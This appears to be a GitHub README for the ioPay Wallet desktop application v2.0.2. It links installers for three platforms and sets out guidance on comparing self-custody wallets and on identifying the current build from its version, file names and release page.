![ioPay Wallet](assets/banner-profile.png)

<h1 align="center">ioPay Wallet</h1>

<p align="center"><em>Choose a wallet on what it does with your keys, then check that the build you installed is the one being described.</em></p>

<p align="center"><a href="#license"><img src="https://img.shields.io/badge/LICENSE-Apache--2.0-0969da?style=for-the-badge&labelColor=0B1733" alt="License: Apache-2.0"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2"><img src="https://img.shields.io/badge/RELEASE-v2.0.2-0969da?style=for-the-badge&labelColor=0B1733" alt="Release: v2.0.2"></a></p>

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

The tag, the assets and the publish date are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2).

> **A comparison is not a download page.** Install only from the release page linked above.

## Why ioPay Wallet

Wallet comparisons usually turn into rankings, and a ranking hides the only question that matters: who holds the key, and what happens when the machine holding it fails. ioPay Wallet answers that question in a way a reader can check. The desktop application generates and stores the key locally, protects it with the operating system's keychain and an app lock, and never asks for an account. There is no sign-up, no email and no server-side credential, so there is nothing for a provider to reset and nothing for a reader to hand over.

That design also sets the boundary. A self-custody wallet cannot recover a lost phrase, and any product claiming to do so is either holding the key or describing a different arrangement. The comparison pages on this account therefore compare on criteria - custody, address handling, staking, hardware signing, platform coverage - rather than on preference, and the peer page names its comparison openly instead of implying a winner.

- **Custody you can verify.** The key stays on the machine; the app shows the address and signs with it.
- **Three platforms, one product.** Windows, macOS and Linux builds ship together for v2.0.2.
- **Hardware signing when you want it.** Ledger and Trezor are supported, with address verification on the device.
- **A build you can identify.** The release assets carry both the platform and the version in the file name, which is what makes the download check possible.

## Which build is current

More than one desktop application has carried the ioPay name. The current one is v2.0.2, published on 19 November 2026 in the ioPay Wallet repository under Apache-2.0. An earlier client shipped a twelve-word phrase and backed up by private key or keystore instead, which is why recovery guides treat phrase, private key and keystore as three separate artifacts.

Four checks separate the current build from an older one: the version on the release page, the file names of the three assets, the backup model on first launch, and the repository the download came from. A review site quoting an older version is not necessarily malicious, but it is describing a different build, and following its instructions against v2.0.2 creates confusion that looks like a fault.

The mobile app is a separate product with a separate release history. It shares the chain and it can share a phrase, because a mobile phrase can be imported into the desktop wallet. It does not share an installer, and a feature in one is not automatically in the other.

## The questions a comparison should answer

A useful comparison answers five questions in order. Who holds the key? What happens to the account if the machine is lost? Which address forms does it support, and does it show them together? What can be done with the balance without leaving the application? Which platforms have a build, and how is that build identified? Everything else - interface taste, colour, the number of menu items - is a preference that should come after those five.

The answer to the first question decides the rest. If a provider can recover the account, the provider holds something that can reconstruct the key, and the comparison is no longer between self-custody products. If the key is local, recovery is the phrase, and the quality of the backup flow matters more than any feature. That is why this account's setup collection spends more pages on backup and recovery than on features.

The last question is the one readers forget. A build is identified by its name, its version and its source page, and a comparison written against a different version is describing a different product. The release page is the current source, the file names carry the platform and the version, and a page that cannot name the version it reviewed has not told you what it compared.

## Guides for this part of the wallet

| Guide | What it answers |
|---|---|
| [How ioPay Wallet Compares to Other Desktop Wallets](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/how-iopay-wallet-compares-to-other-desktop-wallets.md) | Custody, addresses and staking compared on stated criteria rather than on rankings. |
| [Which ioPay Wallet Build Is Current](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/iopay-wallet-and-earlier-desktop-builds.md) | Four checks that separate the current v2.0.2 build from every earlier desktop client release. |
| [Is ioPay a Good Desktop Wallet Alternative?](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/is-iopay-a-good-desktop-wallet-alternative.md) | The cases where it fits, and the cases where it does not. |
| [ioPay for Beginners](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/iopay-for-beginners-choosing-a-first-defi-wallet.md) | What a first self-custody wallet actually needs, before any feature list is worth reading. |
| [ioPay Wallet Versions and Release Notes](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/iopay-wallet-versions-and-release-notes.md) | Where version claims come from, and why the release page is the source. |

This repository is one address in the ioPay Wallet account; the wallet described above is the product, and the comparison guides carry the reasoning.

## Security

**Compare wallets on who holds the key, and treat any product that offers to recover your phrase as one that holds it.**

## Support

No issue tracker exists on these repositories, and no support desk holds credentials. The [help guide](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/how-to-get-help-with-iopay-wallet.md) names the routes that do exist.

## License

Apache-2.0, the licence carried by the ioPay Wallet project itself.

---

[Wallet repository](https://github.com/iopay-project/iopay-desktop-wallet) - [v2.0.2 release](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2) - [All guides](https://github.com/iopay-project/desktop-setup-and-safety)
